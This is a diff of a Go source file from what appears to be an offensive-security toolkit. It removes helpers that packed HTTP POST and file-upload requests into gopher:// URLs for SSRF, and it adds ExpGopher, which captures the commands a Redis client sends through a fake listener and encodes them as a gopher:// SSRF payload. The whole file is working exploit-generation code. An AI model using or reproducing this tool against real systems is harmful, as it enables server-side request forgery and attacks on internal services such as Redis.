@@ -1,74 +1,59 @@
 package gopher
 
 import (
-	"bytes"
 	"fmt"
-	"io"
-	"mime/multipart"
+	"net"
 	"net/url"
-	"os"
+	"regexp"
 	"strings"
+
+	"github.com/virink/virzz/common"
 )
 
-// ExpHTTPPost -
-func ExpHTTPPost(addr string, uri string, datas map[string]string) (string, error) {
-	// param := ""
-	// if len(params) > 0 {
-	// 	g := url.Values{}
-	// 	for key, value := range params {
-	// 		g.Add(key, value)
-	// 	}
-	// 	param = fmt.Sprintf("?%s", g.Encode())
-	// }
-	p := url.Values{}
-	for key, value := range datas {
-		p.Add(key, value)
+// ExpGopher -
+func ExpGopher(addr string, port, n int, quit bool) (string, error) {
+	ln, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
+	if err != nil {
+		return "", err
 	}
-	data := p.Encode()
-	headers := []string{
-		fmt.Sprintf("POST %s HTTP/1.1", uri),
-		fmt.Sprintf("Host: %s", addr),
-		"Content-Type: application/x-www-form-urlencoded",
-		fmt.Sprintf("Content-Length: %d", len(data)),
+	defer ln.Close()
+	common.Logger.Normal("Listen: %s", ln.Addr().String())
+	conn, err := ln.Accept()
+	if err != nil {
+		return "", err
 	}
-	exp := fmt.Sprintf(
-		"gopher://%s/_%s",
-		addr,
-		strings.ReplaceAll(url.QueryEscape(fmt.Sprintf("%s\r\n\r\n%s", strings.Join(headers, "\r\n"), data)), "+", "%20"),
-	)
-	return exp, nil
-}
-
-// ExpHTTPUpload -
-func ExpHTTPUpload(addr string, uri string, datas map[string]string) (string, error) {
-	bodyBuffer := &bytes.Buffer{}
-	bodyWriter := multipart.NewWriter(bodyBuffer)
-	// Field
-	for key, value := range datas {
-		if strings.HasPrefix(value, "@") {
-			name := strings.TrimPrefix(value, "@")
-			fw, _ := bodyWriter.CreateFormFile(key, name)
-			f, _ := os.Open(name)
-			defer f.Close()
-			io.Copy(fw, f)
-		} else {
-			_ = bodyWriter.WriteField(key, value)
+	defer conn.Close()
+	var data = make([]string, n)
+	for i := 0; i < n; i++ {
+		buff := make([]byte, 2048)
+		// Read
+		n, err := conn.Read(buff)
+		if err != nil {
+			return "", err
 		}
+		tmp := string(buff[:n])
+		common.Logger.Debug("buff = %s", tmp)
+		data[i] = tmp
+
+		// Fix redis::command
+		if tmp == "*1\r\n$7\r\nCOMMAND\r\n" {
+			i--
+		}
+		// Resp
+		matches := regexp.MustCompile(`(?m)\*\d+\r\n\$\d+\r\n\w+\r\n`).FindAllString(tmp, -1)
+		if len(matches) > 0 && len(matches[0]) > 0 {
+			conn.Write([]byte("+OK\r\n"))
+			continue
+		}
+		conn.Write([]byte("OK\r\n"))
 	}
-	contentType := bodyWriter.FormDataContentType()
-	bodyWriter.Close()
-	// SSRF Gopher
-	data := bodyBuffer.String()
-	headers := []string{
-		fmt.Sprintf("POST %s HTTP/1.1", uri),
-		fmt.Sprintf("Host: %s", addr),
-		fmt.Sprintf("Content-Type: %s", contentType),
-		fmt.Sprintf("Content-Length: %d", len(data)),
+	if quit {
+		data = append(data, "*1\r\n$4\r\nquit\r\n")
 	}
 	exp := fmt.Sprintf(
 		"gopher://%s/_%s",
 		addr,
-		strings.ReplaceAll(url.QueryEscape(fmt.Sprintf("%s\r\n\r\n%s", strings.Join(headers, "\r\n"), data)), "+", "%20"),
+		strings.ReplaceAll(url.QueryEscape(strings.Join(data, "")), "+", "%20"),
 	)
 	return exp, nil
 }
